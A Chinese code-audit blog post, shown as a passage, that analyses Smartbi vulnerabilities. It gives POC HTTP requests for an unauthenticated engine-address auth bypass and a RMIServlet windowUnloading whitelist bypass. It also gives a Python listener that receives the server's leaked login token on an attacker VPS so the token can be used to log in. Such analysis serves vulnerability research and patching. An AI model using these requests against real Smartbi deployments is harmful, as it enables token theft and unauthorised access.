<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Smartbi系列漏洞详解 | Ho1L0w-By's Blog</title><meta name="keywords" content="Java安全,代码审计"><meta name="author" content="Ho1L0w-By"><meta name="copyright" content="Ho1L0w-By"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Smartbi系列漏洞详解：前言：近期爆出的三个Smartbi产品的漏洞，其主要的漏洞产生原因都是因为没有对用户的访问做限制，或者是攻击者能够通过某些逻辑上的漏洞，绕过限制，对一些敏感的类，或是方法进行访问。 以下将对三个Smartbi中的漏洞进行分析，会首先给出POC，再根据POC给出分析过程和可利用的EXP。 1. &#x2F;api&#x2F;monitor&#x2F;setEngineAd">
<meta property="og:type" content="article">
<meta property="og:title" content="Smartbi系列漏洞详解">
<meta property="og:url" content="https://ho1l0w-by.github.io/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/index.html">
<meta property="og:site_name" content="Ho1L0w-By&#39;s Blog">
<meta property="og:description" content="Smartbi系列漏洞详解：前言：近期爆出的三个Smartbi产品的漏洞，其主要的漏洞产生原因都是因为没有对用户的访问做限制，或者是攻击者能够通过某些逻辑上的漏洞，绕过限制，对一些敏感的类，或是方法进行访问。 以下将对三个Smartbi中的漏洞进行分析，会首先给出POC，再根据POC给出分析过程和可利用的EXP。 1. &#x2F;api&#x2F;monitor&#x2F;setEngineAd">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ho1l0w-by.github.io/img/background.jpg">
<meta property="article:published_time" content="2023-09-21T10:04:57.000Z">
<meta property="article:modified_time" content="2023-09-21T10:13:55.677Z">
<meta property="article:author" content="Ho1L0w-By">
<meta property="article:tag" content="Java安全">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ho1l0w-by.github.io/img/background.jpg"><link rel="shortcut icon" href="/img/Myhead.jpg"><link rel="canonical" href="https://ho1l0w-by.github.io/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Smartbi系列漏洞详解',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-09-21 18:13:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/Myhead.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%B9%A6%E8%AF%84"><i class="fa-fw fa fa-book"></i><span> 书评</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ho1L0w-By's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%B9%A6%E8%AF%84"><i class="fa-fw fa fa-book"></i><span> 书评</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Smartbi系列漏洞详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-21T10:04:57.000Z" title="发表于 2023-09-21 18:04:57">2023-09-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-21T10:13:55.677Z" title="更新于 2023-09-21 18:13:55">2023-09-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Smartbi系列漏洞详解"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Smartbi系列漏洞详解："><a href="#Smartbi系列漏洞详解：" class="headerlink" title="Smartbi系列漏洞详解："></a>Smartbi系列漏洞详解：</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>近期爆出的三个Smartbi产品的漏洞，其主要的漏洞产生原因都是因为没有对用户的访问做限制，或者是攻击者能够通过某些逻辑上的漏洞，绕过限制，对一些敏感的类，或是方法进行访问。</p>
<p>以下将对三个Smartbi中的漏洞进行分析，会首先给出POC，再根据POC给出分析过程和可利用的EXP。</p>
<h2 id="1-x2F-api-x2F-monitor-x2F-setEngineAddress-权限绕过漏洞"><a href="#1-x2F-api-x2F-monitor-x2F-setEngineAddress-权限绕过漏洞" class="headerlink" title="1. &#x2F;api&#x2F;monitor&#x2F;setEngineAddress 权限绕过漏洞"></a>1. &#x2F;api&#x2F;monitor&#x2F;setEngineAddress 权限绕过漏洞</h2><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>首先给出POC:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /smartbi/smartbix/api/monitor/setEngineAddress HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQConfigLogined=; FQPassword=; JSESSIONID=BEF47407273964E120DDB8C848EE877C</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>向以上接口，以POST方式发送任意值，能够获得以下返回包，即可证明漏洞存在（<strong>需要注意的是，Content-Type需要设为text&#x2F;plain，而非application&#x2F;x-www-form-urlencoded</strong>）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828190840450.png" alt="image-20230828190840450"></p>
<p>该漏洞的主要成因，是Smartbi的设计者没有对用户访问以下路径做限制：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828191238559.png" alt="image-20230828191238559"></p>
<p>接下来开始分析。</p>
<p>首先，在<code>smartbix.datamining.service.MonitorService.class</code>类中，可以看到对于上述路径的具体操控：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828191629529.png" alt="image-20230828191629529"></p>
<p>当通过POST方式，传入任何参数的时候，在处理中会调用<code>this.systemConfigService.updateSystemConfig()</code>函数，将我们传入的任意参数作为<code>engineAddress</code>传入。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828191949194.png" alt="image-20230828191949194"></p>
<p>随后，该函数会将我们传入的参数存储后，更新为整个系统中的引擎地址(engineAddress)。</p>
<p>当我们访问engineInfo接口的时候，即可看到更新后的引擎地址，此时engineAddress已经被成功的更新为成了123</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828192451101.png" alt="image-20230828192451101"></p>
<p>随后，我们访问token接口，即可完成对于该漏洞的利用。</p>
<p>具体可以在<code>MonitorService.class</code>类中找到对该接口的处理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionPermission(&#123;&quot;NOT_LOGIN_REQUIRED&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getToken</span><span class="params">(<span class="meta">@RequestBody</span> String type)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="built_in">this</span>.catalogService.getToken(<span class="number">10800000L</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtil.isNullOrEmpty(token)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> SmartbiXException.create(CommonErrorCode.NULL_POINTER_ERROR).setDetail(<span class="string">&quot;token is null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;SERVICE_NOT_STARTED&quot;</span>.equals(token)) &#123;</span><br><span class="line">            Map&lt;String, String&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            result.put(<span class="string">&quot;token&quot;</span>, token);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;experiment&quot;</span>.equals(type)) &#123;</span><br><span class="line">                EngineApi.postJsonEngine(EngineUrl.ENGINE_TOKEN.name(), result, Map.class, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;service&quot;</span>.equals(type)) &#123;</span><br><span class="line">                EngineApi.postJsonService(ServiceUrl.SERVICE_TOKEN.name(), result, Map.class, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;EngineApi.address(<span class="string">&quot;service-address&quot;</span>)&#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再这部分代码中，首先在开头注明了，<code>/token</code>路径，无需登录即可访问，这是漏洞能够触发的基础。</p>
<p>当进入程序块后，会通过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="built_in">this</span>.catalogService.getToken(<span class="number">10800000L</span>);</span><br></pre></td></tr></table></figure>

<p>进行token获取。这里看一下调用链条中的一个可能会坑的判定条件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828193941722.png" alt="image-20230828193941722"></p>
<p>这个a用于标识框架是否运行，如果在本地复现环境的时候，没有启动用户界面框架，会导致漏洞利用失败，此时，将a设置为true即可。</p>
<p>当通过上述方法获取到了token了之后，随即向下走：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828194715596.png" alt="image-20230828194715596"></p>
<p>我们需要调用的函数是在if中的<code>EngineApi.postJsonEngine()</code>，为了进入if，我们POST传入参数的时候，必须传入一个<code>experiment</code>。</p>
<p>随后查看一下<code>postJsonEngine()</code>方法的具体调用逻辑：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828195106265.png" alt="image-20230828195106265"></p>
<p>可以看到这里，postJsonEngine方法首先会通过<code>EngineUrl.getUrl()</code>函数，获取一个url，随后通过<code>HttpKit.postJson()</code>函数，将token作为data的值，将它post过去。</p>
<p>这里详细看getUrl的调用链：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828200000844.png" alt="image-20230828200000844"></p>
<p>可以看到这里，获取了SystemConfigService中，键为<code>ENGINE_ADDRESS</code>的值。</p>
<p>这里也就是我们之前设置的EngineAddress的值，将其作为url返回。</p>
<p>接下来，当程序执行到<code>HttpKit.postJson()</code> 的时候，便会将token通过POST的方式，以JSON的格式发送到我们设置的url地址上。</p>
<p>因此我们只需发送以下request请求包，nc监听对应的端口，即可在个人vps上获取到token:</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828201055875.png" alt="image-20230828201055875"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828201017512.png" alt="image-20230828201017512"></p>
<h3 id="坑点解析："><a href="#坑点解析：" class="headerlink" title="坑点解析："></a>坑点解析：</h3><p>理论上来说，只要我们带着这个token的值去访问loginByToken路径，就能够获取到可以登录的session值。</p>
<p>但是很不幸的是，这里的token是<strong>不能使用</strong>的，主要的问题出在这里：</p>
<p>当smartbi向我们的vps发送token的时候，POST请求最后的发送点在<code>HttpKit.class#exe()</code>方法中	：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829142911810.png" alt="image-20230829142911810"></p>
<p>可以发现，在第一个红框中，会获取smartbi发送请求后获得的响应值<code>response</code>，因此，我们的服务器端需要给出一个返回值。</p>
<p>在接下来的第二个红框中，会尝试将返回的<code>response</code>中的body部分，以json格式进行值的获取。这里告诉我们，vps返回的<code>response</code>必须是以json格式类型返回。</p>
<p>当上述解析成功之后，继续跟入，会来到<code>EntityInsertAction.class</code>的<code>afterTransactionCompletion()</code>方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829144013064.png" alt="image-20230829144013064"></p>
<p>这里的ck，就是Smartbi发送到用户端的token值。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829144745072.png" alt="image-20230829144745072"></p>
<p>随后通过第二个红框中的<code>persister.getCache().afterInsert()</code>方法，将这个token存入对应的变量中，就是下面图片中的<code>this.cache.update</code>函数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829144959607.png" alt="image-20230829144959607"></p>
<p>当我们对<code>loginByToken()</code>函数调用的时候，实际上就是调用这里存入的token值进行比对，如果比对成功即可登录。</p>
<p><strong>因此，如果我们没有在vps中返回一个json格式的任意返回值，就不会调用到afterTransactionCompletion()方法，也就不能将token值存入变量，用于对比，自然也就登录失败了。</strong></p>
<p>这里查看一下<code>MonitorService.class</code>类中，<code>loginByToken()</code>方法的调用链：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828201528434.png" alt="image-20230828201528434"></p>
<p>这里一路跟入，查看调用链：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828202045139.png" alt="image-20230828202045139"></p>
<p>可以发现，最后来到了<code>AbstractDAO.class</code>中的<code>load()</code>方法中。其中，第一个红框中的判断，当第一次访问的时候就是null，但是会在使用token访问后，留下缓存，如果上次访问出现问题，抛出异常，会返回一个null。</p>
<p>第一次访问时：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829122122303.png" alt="image-20230829122122303"></p>
<p>第二次访问时会查看上次的缓存，如果上次访问失败，或是出现异常，会返回一个null：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829122002153.png" alt="image-20230829122002153"></p>
<p>继续调用load方法，接下来会来到：</p>
<p><code>DefaultLoadEventListener.class#loadFromSecondLevelCache()</code>方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828203338387.png" alt="image-20230828203338387"></p>
<p>可以看到这里<code>ce</code>的值，是通过<code>persister.getCache().get(ck,source.getTimestamp())</code>函数获得的，这里就是在把用户传入的<code>token</code>(也就是<code>ck</code>)，与我们之前存入的<code>ck</code>值作比较。成功，<code>ce</code>的值就不会为null，也就是登录成功。</p>
<h3 id="正确利用漏洞的方案："><a href="#正确利用漏洞的方案：" class="headerlink" title="正确利用漏洞的方案："></a>正确利用漏洞的方案：</h3><p>经过以上分析，我们不难知道，我们需要在服务器上开启一个监听某个端口的简单服务，当接收到Smartbi发送的token值的时候，返回一个json格式的任意值的响应包，才能正常的使用token。</p>
<p>这里我使用Python3简单实现了一个服务：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSONHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_set_response</span>(<span class="params">self, status_code=<span class="number">200</span>, content_type=<span class="string">&#x27;application/json&#x27;</span></span>):</span><br><span class="line">        self.send_response(status_code)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, content_type)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        json_data = json.loads(post_data)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received JSON:&quot;</span>, json_data)</span><br><span class="line">        </span><br><span class="line">        response_data = &#123;</span><br><span class="line">            <span class="string">&quot;message&quot;</span>: <span class="string">&quot;JSON received and processed successfully&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = json.dumps(response_data).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self._set_response()</span><br><span class="line">        self.wfile.write(response)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">server_class=HTTPServer, handler_class=JSONHandler, port=<span class="number">2333</span></span>):</span><br><span class="line">    server_address = (<span class="string">&#x27;&#x27;</span>, port)</span><br><span class="line">    httpd = server_class(server_address, handler_class)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Listening on port <span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>

<p>当发送了token后，VPS上接收到：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829150934217.png" alt="image-20230829150934217"></p>
<p>接下来，向login路径，发送获取到的token值。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829151704985.png" alt="image-20230829151704985"></p>
<p>将返回的Cookie获取下来，带着访问，即可绕过登录。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829151908784.png" alt="image-20230829151908784"></p>
<h2 id="2-x2F-vision-x2F-RMIServlet-windowUnloading参数，逻辑漏洞"><a href="#2-x2F-vision-x2F-RMIServlet-windowUnloading参数，逻辑漏洞" class="headerlink" title="2. &#x2F;vision&#x2F;RMIServlet?windowUnloading参数，逻辑漏洞"></a>2. &#x2F;vision&#x2F;RMIServlet?windowUnloading参数，逻辑漏洞</h2><h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>首先还是给出POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54 HTTP/1.1</span><br><span class="line">Host: localhost:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQConfigLogined=; JSESSIONID=AA35FAB6507174C68D84297771E71345; Phpstorm-4588ec75=9665af70-58e7-4baf-8fce-3fbfb54208c8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line">className=&amp;methodName=&amp;params=[]</span><br></pre></td></tr></table></figure>

<p>当发送了以上请求包后，能够从返回包中获取如下内容：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829152543109.png" alt="image-20230829152543109"></p>
<p>即可证明漏洞存在。</p>
<p>该漏洞的主要成因，是在于开发者在处理用户对<code>/vision/RMIServlet</code>这条路径的访问逻辑的时候，出现了逻辑错误。</p>
<p>接下来开始分析。</p>
<p>当用户访问<code>/vision/RMIServlet</code>这条路径的时候，会首先经过<code>smartbi.freequery.filter.CheckIsLoggedFilter.class</code>类，通过其中的<code>doFilter()</code>函数进行一个过滤。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829173243088.png" alt="image-20230829173243088"></p>
<p>这个函数的主要目的是，以正确的方式获取请求中传入的三个参数，分别是类名(className)，方法名(methodName)，参数(params)。</p>
<p>在这个函数里，开发者一共提供了三种方式来获取分别是：</p>
<p>1、当请求的路径中参数以windowUnloading开头时，</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829173928513.png" alt="image-20230829173928513"></p>
<p>则通过url解码，然后调用一个解密函数来获取三个值。</p>
<p>2、如果不是以windowUnloading开头，则从请求体流中获取三个值：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829174254675.png" alt="image-20230829174254675"></p>
<p>3、如果不是上述两种情况，则从请求中获取三个值：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829174643659.png" alt="image-20230829174643659"></p>
<p>当获取了三个值后，通过解密函数<code>RMICoder.decode()</code>，随后将其赋值给<code>className</code>,<code>methodName</code>,<code>params</code>这三个变量：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829175606879.png" alt="image-20230829175606879"></p>
<p>随后一路正常跟进，来到这里的判定：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829175954929.png" alt="image-20230829175954929"></p>
<p>在这个<code>FilterUtil.needToCheck()</code>函数中，会检查一个包含类名和方法名的白名单，当满足白名单，即可返回false，继续下一部分判断：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829180213984.png" alt="image-20230829180213984"></p>
<p>这里我们通过<code>windowUnloading</code>参数传入的类是<code>UserService</code>类，方法是<code>checkVersion()</code>方法，在白名单中。</p>
<p>因此直接过了这部分的检测，继续下一部分的程序。</p>
<p>跟进到<code>smartbi.framework.rmi.RMIServlet.class</code>类中，因为我们使用的POST方式传参数，因此此时调用到<code>doPost()</code>方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829180924726.png" alt="image-20230829180924726"></p>
<p>在红框这部分的代码中，可以发现出现了一个很大的逻辑问题，这里的<code>rmiInfo</code>变量原本应该是我们通过windowUnloading参数传入的类名，方法名和参数值，但是这里通过<code>RMIUtil.parseRMIInfo()</code>函数，通过POST中的参数，重新给三个值赋了一次值。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829184051597.png" alt="image-20230829184051597"></p>
<p>这里是我随便传入的几个值。</p>
<p>随后，程序会步入到processExecute()函数中，这里看一下调用链：</p>
